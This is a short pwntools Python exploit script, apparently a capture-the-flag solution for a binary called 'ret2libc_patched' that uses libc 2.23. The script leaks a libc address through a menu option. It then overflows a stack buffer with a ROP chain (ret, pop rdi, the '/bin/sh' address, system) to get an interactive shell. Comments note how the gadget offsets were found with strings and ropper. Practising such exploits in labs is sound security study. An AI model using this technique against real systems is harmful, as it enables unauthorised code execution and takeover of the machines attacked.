from pwn import *

io = process("./ret2libc_patched")
#io = remote("xxx.xx.xxx.xx", xxxxx)
libc = ELF("./libc-2.23.so")

def show_address():
    io.sendafter(b"Your choice: ", b'1')
    io.recvuntil(b"You need to figure it out:")
    io.recvuntil(b' ')
    io.recvuntil(b' ')
    libc_addr = int(io.recvuntil(b' ', drop=True), 16) - libc.symbols["puts"]
    return libc_addr

def return_to_somewhere(ret, p_rdi, bin_sh_addr, system_addr):
    io.sendafter(b"Your choice: ", b'2')
    io.sendlineafter(b"input: ", b'a' * 0x10 + p64(0xdeadbeef) + p64(ret) + p64(p_rdi) + p64(bin_sh_addr) + p64(system_addr))

libc.address = show_address()
print("libc.address = " + hex(libc.address))

# strings --radix=x ./libc-2.23.so | grep /bin/sh
# ropper --file ./libc-2.23.so --nocolor > g
return_to_somewhere(libc.address + 0x937, libc.address + 0x21112, libc.address + 0x18ce57, libc.symbols["system"])

io.interactive()
